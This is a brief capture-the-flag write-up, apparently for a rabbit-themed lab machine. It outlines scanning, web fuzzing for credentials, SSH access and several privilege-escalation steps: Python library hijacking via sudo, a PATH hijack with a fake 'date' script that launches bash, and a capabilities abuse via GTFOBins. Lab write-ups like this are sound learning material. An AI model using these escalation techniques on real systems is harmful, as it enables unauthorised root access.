
#medium 
### nmap scan : 

22 : ssh
80 : http
### web fuzz : 

/r/a/b/b/i/t : find credentials 

login with ssh
### shell : 

login with ssh

### privelege escalation : 

sudo -l

find python script with random library

create a file python ( the library ) with a shell in the same directory

execute the python script and bom , escalate to another user .

find a executable file

on a python server to get the file to our machine 

use wget to get the file 

analyse the file with : 

file file.sh
cat file.sh 
strings file.sh

find a line : ``
``/bin/echo -n 'Probably by ' && date --date='next hour' 

**priveleg escalation PATH** : 

create date file with : 
```
#!/bin/bash
/bin/bash
```

make it executable : chmod +x date

add the pwd of this file to the PATH : ``export PATH=/home/rabbit:$PATH

execute the file and bom .

find password.txt , relogin with ssh

**priveleg escalation with capabilties  : 

do a cmd to find them => gtfobins => root